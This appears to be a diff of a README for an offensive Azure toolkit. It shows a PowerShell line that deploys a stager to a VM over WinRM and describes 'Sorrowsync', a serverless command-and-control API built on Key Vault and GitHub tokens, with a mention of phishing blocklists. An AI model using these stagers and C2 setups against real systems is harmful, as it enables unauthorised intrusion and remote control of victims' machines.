@@ -79,7 +79,6 @@ $scriptPath = ".\Stager.ps1"
 # winRm
 $Ip = ''
 .\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
-
 ```
 
 <br>
@@ -87,6 +86,8 @@ $Ip = ''
 #### Sorrowsync - Deploy Function and configure Networking
 
 Serverless C2 API, requires keyVault and managed Identity or access policy. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.
+
+xHooktoken is your agent's client api key, the other tokens are server-side api keys.
 
 ***TODO: Pull the blocklist and user agent blocks from the phishing functions and implement it in this project.
 
